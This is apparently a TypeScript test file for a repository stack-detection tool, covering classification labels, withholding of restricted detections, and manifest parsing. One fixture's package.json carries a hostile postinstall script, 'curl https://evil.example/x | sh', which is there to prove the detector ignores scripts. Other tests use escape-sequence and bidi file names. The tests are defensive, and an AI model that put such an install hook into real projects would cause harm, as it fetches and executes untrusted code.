    let doc = ok(emptyStack(), { kind: 'component.upsert', path: 'services/billing', name: 'Billing', targets: ['server'], classification: 'restricted' });
    expect(doc.components[0]!.classification).toBe('restricted');
    doc = ok(doc, { kind: 'component.upsert', path: 'services/billing', name: 'Billing API', targets: ['server'] });
    expect(doc.components[0]).toMatchObject({ name: 'Billing API', classification: 'restricted' });
    expect(stackBrainSources(doc)[0]!.classification).toBe('restricted');
    expect(stackBrainSources(withComponent('apps/web', 'Web', ['web'])(emptyStack()))[0]!.classification).toBe('internal');
  });

  it('a component\'s label only rises: lowering it is refused, and the explicit way is to remove the component, which is recorded', () => {
    let doc = ok(emptyStack(), { kind: 'component.upsert', path: 'services/billing', name: 'Billing', targets: ['server'], classification: 'restricted' });
    expect(applyStackAction(doc, { kind: 'component.upsert', path: 'services/billing', name: 'Billing', targets: ['server'], classification: 'internal' })).toMatchObject({ ok: false, code: 'classification_downgrade' });
    expect(applyStackAction(doc, { kind: 'component.upsert', path: 'services/billing', name: 'Billing', targets: ['server'], classification: 'public' })).toMatchObject({ ok: false, code: 'classification_downgrade' });
    doc = ok(doc, { kind: 'component.upsert', path: 'services/billing', name: 'Billing', targets: ['server'], classification: 'secret' });
    expect(doc.components[0]!.classification).toBe('secret');
    // An unlabelled component counts as internal: public would lower it.
    const plain = ok(emptyStack(), { kind: 'component.upsert', path: 'apps/web', name: 'Web', targets: ['web'] });
    expect(applyStackAction(plain, { kind: 'component.upsert', path: 'apps/web', name: 'Web', targets: ['web'], classification: 'public' })).toMatchObject({ ok: false, code: 'classification_downgrade' });
    // Removing a labelled component needs an explicit acknowledgement, and is logged with who and when.
    expect(applyStackAction(doc, { kind: 'component.remove', path: 'services/billing' })).toMatchObject({ ok: false, code: 'classification_downgrade' });
    const r = applyStackAction(doc, { kind: 'component.remove', path: 'services/billing', acknowledgeLabel: true }, { by: 'owner_1', at: '2026-11-10T09:00:00.000Z' });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.doc.components).toEqual([]);
    expect(r.doc.labelLog).toEqual([{ path: 'services/billing', classification: 'secret', removedBy: 'owner_1', removedAt: '2026-11-10T09:00:00.000Z' }]);
    expect(ok(r.doc, { kind: 'component.upsert', path: 'services/billing', name: 'Billing', targets: ['server'] }).components[0]!.classification).toBeUndefined();
  });

  it('detection under a restricted or secret component is withheld, keeping only a count', () => {
    let doc = ok(emptyStack(), { kind: 'component.upsert', path: 'services/billing', name: 'Billing', targets: ['server'], classification: 'restricted' });
    const ev = (path: string) => ({ path, detail: 'x' });
    doc = { ...doc, detection: { commit: 'c'.repeat(40), detectedAt: '2026-11-10T08:00:00.000Z', runnerId: 'r', items: [
      { detectionId: 'det:services/billing:stripe', componentPath: 'services/billing', entryId: 'stripe', version: null, evidence: ev('services/billing/package.json'), state: 'proposed' as const },
      { detectionId: 'det:services/billing/sub:react', componentPath: 'services/billing/sub', entryId: 'react', version: null, evidence: ev('services/billing/sub/package.json'), state: 'proposed' as const },
      { detectionId: 'det:services/billing-ui:react', componentPath: 'services/billing-ui', entryId: 'react', version: null, evidence: ev('services/billing-ui/package.json'), state: 'proposed' as const },
    ], commands: [{ componentPath: 'services/billing', kind: 'build', script: 'build', command: 'npm run build', body: 'tsc', evidencePath: 'services/billing/package.json' }],
    skipped: [{ path: 'services/billing/x/package.json', reason: 'symlink' }, { path: 'other/package.json', reason: 'symlink' }] } } as StackDocument;
    const w = withholdRestrictedDetection(doc);
    expect(w.detection!.items.map((i) => i.detectionId)).toEqual(['det:services/billing-ui:react']);
    expect(w.detection!.commands).toEqual([]);
    expect(w.detection!.skipped).toEqual([{ path: 'other/package.json', reason: 'symlink' }]);
    expect(w.detection!.withheld).toBe(4);
    expect(JSON.stringify(w)).not.toContain('stripe');
  });

  it('custom labels with no Latin letters or digits keep distinct keys', () => {
    const a = stackItemKey({ kind: 'custom', label: '框架', canonicalSource: null });
    const b = stackItemKey({ kind: 'custom', label: 'フレーム', canonicalSource: null });
    expect(a).not.toBe(b);
    expect(a).toMatch(/^custom:u[0-9a-f]+$/);
    expect(stackItemKey({ kind: 'custom', label: '框架', canonicalSource: null })).toBe(a);
    let doc = withComponent('.', 'Repository', [])(emptyStack());
    doc = ok(doc, { kind: 'item.add', path: '.', category: 'frameworks', item: { kind: 'custom', label: '框架', canonicalSource: null } });
    doc = ok(doc, { kind: 'item.add', path: '.', category: 'frameworks', item: { kind: 'custom', label: 'フレーム', canonicalSource: null } });
    expect(doc.components[0]!.categories.frameworks).toMatchObject({ state: 'selected', items: [{ label: '框架' }, { label: 'フレーム' }] });
    expect(stackItemKey({ kind: 'custom', label: 'In-house router', canonicalSource: null })).toBe('custom:inhouserouter');
  });

  it('the repository root component is in scope for every task', () => {
    let doc = withComponent('.', 'Repository', ['web'])(emptyStack());
    doc = ok(doc, { kind: 'item.add', path: '.', category: 'package_build', item: { kind: 'catalog', entryId: 'pnpm' } });
    const s = stackBrainSources(doc);
    expect(s[0]!.sourceId).toBe('stack:.');
    expect(s[0]!.sections.map((x) => x.key)).toContain('component:.:package_build:pnpm');
  });
});

describe('static detection: manifests, lockfiles and config, never scripts', () => {
  const pkg = JSON.stringify({
    name: 'web', packageManager: 'pnpm@9.12.2', engines: { node: '>=24 <25' },
    scripts: { build: 'next build', test: 'vitest run', postinstall: 'curl https://evil.example/x | sh', dev: 'next dev' },
    dependencies: { next: '15.1.0', react: '^19.0.0', '@clerk/nextjs': '6.0.0', stripe: '17.0.0' },
    devDependencies: { vitest: '5.1.0', typescript: '5.9.3' },
  });

  it('detects entries with evidence from manifests, lockfiles and config files, per component path', () => {
    const r = detectStack([
      { path: 'apps/web/package.json', content: pkg },
      { path: 'pnpm-lock.yaml', content: 'lockfileVersion: 9.0' },
      { path: 'apps/web/next.config.mjs', content: 'export default {}' },
      { path: 'services/api/requirements.txt', content: 'fastapi==0.115.0\nuvicorn>=0.30\n# comment\n' },
      { path: 'apps/mobile/pubspec.yaml', content: 'name: m\ndependencies:\n  flutter:\n    sdk: flutter\n' },
      { path: 'svc/go.mod', content: 'module x\n\ngo 1.23\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.10.0\n)\n' },
    ]);
    const find = (componentPath: string, entryId: string) => r.items.find((i) => i.componentPath === componentPath && i.entryId === entryId);
    expect(find('apps/web', 'nextjs')).toMatchObject({ version: '15.1.0', evidence: { path: 'apps/web/package.json', detail: 'dependencies.next 15.1.0' } });
    expect(find('apps/web', 'clerk')).toMatchObject({ evidence: { path: 'apps/web/package.json' } });
    expect(find('apps/web', 'stripe')).toBeDefined();
    expect(find('apps/web', 'pnpm')).toMatchObject({ version: '9.12.2', evidence: { detail: 'packageManager pnpm@9.12.2' } });
    expect(find('apps/web', 'nodejs')).toMatchObject({ version: '>=24 <25' });
    expect(find('.', 'pnpm')).toMatchObject({ evidence: { path: 'pnpm-lock.yaml', detail: 'lockfile' } });
    expect(find('services/api', 'fastapi')).toMatchObject({ version: '==0.115.0', evidence: { path: 'services/api/requirements.txt' } });
    expect(find('apps/mobile', 'flutter')).toBeDefined();
    expect(find('svc', 'gin')).toMatchObject({ version: 'v1.10.0' });
    expect(r.items.every((i) => stackEntry(i.entryId) !== undefined)).toBe(true);
  });

  it('build and test scripts are proposals with their evidence; no other script is proposed, and none is run', () => {
    const r = detectStack([{ path: 'package.json', content: pkg }]);
    expect(r.commands).toEqual([
      { componentPath: '.', kind: 'build', script: 'build', command: 'pnpm run build', body: 'next build', evidencePath: 'package.json' },
      { componentPath: '.', kind: 'test', script: 'test', command: 'pnpm run test', body: 'vitest run', evidencePath: 'package.json' },
    ]);
    expect(JSON.stringify(r)).not.toContain('evil.example');
  });

  it('a manifest that is not valid JSON or too large is skipped with a reason, not guessed at', () => {
    const r = detectStack([{ path: 'package.json', content: '{not json' }, { path: 'a/package.json', content: 'x'.repeat(300_000) }]);
    expect(r.items).toEqual([]);
    expect(r.skipped).toEqual([{ path: 'a/package.json', reason: 'too_large' }, { path: 'package.json', reason: 'unreadable' }]);
  });

  it('a path with control or bidi characters is never read or reported raw, so one odd file name cannot spoil a report', () => {
    expect(isStackDetectionPath('a\u001b[31m/package.json')).toBe(false);
    expect(isStackDetectionPath('apps/\u202eweb/package.json')).toBe(false);
    const r = detectStack([{ path: 'a\u001b[31m/package.json', content: '{}' }, { path: 'vite.config.<b>x</b>' }, { path: 'package.json', content: JSON.stringify({ dependencies: { react: '19.3.1' } }) }]);
    expect(r.items.map((i) => i.entryId)).toEqual(['react']);
    for (const s of r.skipped) expect(s.path).toMatch(/^[\x20-\x7e]+$/);
    expect(StackDetectionRecordSchema.shape.skipped.safeParse(r.skipped).success).toBe(true);
  });

  it('reads only named manifest, lockfile and config paths, never vendored trees or VCS metadata', () => {
    expect(isStackDetectionPath('package.json')).toBe(true);
    expect(isStackDetectionPath('apps/web/package.json')).toBe(true);
    expect(isStackDetectionPath('apps/web/vite.config.ts')).toBe(true);
    expect(isStackDetectionPath('.github/workflows/ci.yml')).toBe(true);
    expect(isStackDetectionPath('node_modules/react/package.json')).toBe(false);
    expect(isStackDetectionPath('vendor/x/composer.json')).toBe(false);
    expect(isStackDetectionPath('src/index.ts')).toBe(false);
    expect(isStackDetectionPath('../package.json')).toBe(false);
  });

  it('a detection is a proposal: confirming it adds the entry, with its evidence, to the component at that path', () => {
    const r = detectStack([{ path: 'apps/web/package.json', content: pkg }]);
    let doc: StackDocument = { ...emptyStack(), detection: { commit: 'c'.repeat(40), detectedAt: '2026-11-10T08:00:00.000Z', runnerId: 'runner_1', items: r.items.map((i) => ({ ...i, state: 'proposed' as const })), commands: r.commands, skipped: r.skipped } };
    const id = doc.detection!.items.find((i) => i.entryId === 'nextjs')!.detectionId;
    const res = applyStackAction(doc, { kind: 'detection.confirm', detectionId: id });
    if (!res.ok) throw new Error(res.code);
    doc = res.doc;
    expect(doc.components.map((c) => c.path)).toEqual(['apps/web']);
    expect(doc.components[0]!.categories.frameworks).toEqual({ state: 'selected', items: [{ kind: 'catalog', entryId: 'nextjs', version: '15.1.0', origin: 'detected', evidence: { path: 'apps/web/package.json', detail: 'dependencies.next 15.1.0' } }] });
    expect(doc.detection!.items.find((i) => i.detectionId === id)!.state).toBe('confirmed');
    const dismissed = applyStackAction(doc, { kind: 'detection.dismiss', detectionId: doc.detection!.items.find((i) => i.entryId === 'stripe')!.detectionId });
    expect(dismissed.ok && dismissed.doc.detection!.items.find((i) => i.entryId === 'stripe')!.state).toBe('dismissed');
    expect(applyStackAction(doc, { kind: 'detection.confirm', detectionId: 'det:nope' })).toMatchObject({ ok: false, code: 'stack_detection_not_found' });
  });
});
